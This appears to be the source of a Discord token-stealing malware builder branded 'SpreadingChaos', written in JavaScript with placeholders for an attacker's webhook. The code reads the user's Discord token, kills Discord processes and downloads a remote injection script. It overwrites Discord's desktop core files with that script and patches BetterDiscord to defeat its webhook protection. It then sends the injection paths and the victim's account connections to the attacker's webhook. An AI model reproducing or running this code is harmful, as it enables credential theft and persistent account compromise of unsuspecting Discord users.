var glob = require("glob");
const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');
const axios = require('axios');
const buf_replace = require('buffer-replace');
const dawebhook = "%WEBHOUK%1"

const token = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()

const config = {
    "logout": "%LOGOUT%1",
    "inject-notify": "%INJECTNOTI%1",
    "logout-notify": "%LOGOUTNOTI%1",
    "init-notify":"%INITNOTI%1",
    "embed-color": %MBEDCOLOR%1,
    "disable-qr-code": "%DISABLEQRCODE%1"
}




var LOCAL = process.env.LOCALAPPDATA
var discords = [];
var injectPath = [];
var runningDiscords = [];


fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});

discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
    })
    
});
listDiscords();
function Infect() {
    https.get('https://raw.githubusercontent.com/zpiratee/test/main/injection.js', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", dawebhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("0000000",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                    encoding: 'utf8',
                    flag: 'w'
                });
                if (config["init-notify"] == "true") {
                    let init = file.replace("index.js", "init")
                    if (!fs.existsSync(init)) {
                        fs.mkdirSync(init, 0744)
                    }
                }
                if ( config.logout != "false" ) {

                    let folder = file.replace("index.js", "SpreadingChaosBTW")
                    if (!fs.existsSync(folder)) {
                        fs.mkdirSync(folder, 0744)
                        if (config.logout == "instant") {
                            startDiscord();
                        }
                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
                        startDiscord();
                    }
                }
            })
            
        });
    }).on("error", (err) => {
        console.log(err);
    });
};


function listDiscords() {
    exec('tasklist', function(err,stdout, stderr) {

        
        if (stdout.includes("Discord.exe")) {

            runningDiscords.push("discord")
        }
        if (stdout.includes("DiscordCanary.exe")) {

            runningDiscords.push("discordcanary")
        }
        if (stdout.includes("DiscordDevelopment.exe")) {

            runningDiscords.push("discorddevelopment")
        }
        if (stdout.includes("DiscordPTB.exe")) {

            runningDiscords.push("discordptb")
        };
        if (config.logout == "instant") {
            killDiscord();
        } else {
            if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
                injectNotify();
            }
            Infect()
            pwnBetterDiscord()
        }
    })


   
};

function killDiscord() {
    runningDiscords.forEach(disc => {
        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
            if (err) {
              return;
            }
          });
    });
    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
        injectNotify();
    }

    Infect()
    pwnBetterDiscord()
};

function startDiscord() {
    runningDiscords.forEach(disc => {
        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
        exec(path, (err) => {
            if (err) {
              return;
            }
          });
    });
};
function pwnBetterDiscord() {
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "zpirate"))
    } else {
        return;
    }

}


function injectNotify() {
    var fields = [];
    injectPath.forEach( path => {
        var c = {
            name: ":syringe: Inject Path",
            value: `\`\`\`${path}\`\`\``,
            inline: !1
        }
        fields.push(c)
    })
    axios
	.post(dawebhook, {
        "content": null,
        "embeds": [
          {
            "title": ":detective: Successfull injection",
            "color": config["embed-color"],
            "fields": fields,
            "author": {
              "name": "SpreadingChaos"
            },
            "footer": {
              "text": "SpreadingChaos"
            }
          }
        ]
      })
	.then(res => {
	})
	.catch(error => {

    })
	
	var request = new XMLHttpRequest();
    request.open("POST", dawebhook);
    request.setRequestHeader('Content-type', 'application/json');

    if(!token){
        return;
    } else {

    axios
            .get(
                "https://discord.com/api/v9/users/@me/connections",
                {
                headers: {
                    "Content-Type": "application/json",
                    Authorization: token,
                },
                }
            )
        .then((conns) => {
                if (conns.data.length >= 1) {



                var culoembed = {
                    color: 0000000,
                    title: "Connections",
                    fields: [],
                };
                conns.data.forEach((connection) => {
                    var lavergadejuan = "no";
                    culoembed.fields.push({
                    name: `${penemojis[connection.type]} ${
                        connection.type
                    }`,
                    value: `\`Username:\` ${connection.name}\n\`ID:\` ${connection.id}\n\`Access Token:\` **[Copy here](https://raw.deltastealer.gq/${lavergadejuan})**`,
                    inline: true,
                    });
                });
                request.send(JSON.stringify(culoembed))
            .then(res => {
            })
            .catch(error => {
        
            })
                }
            })
    }

}
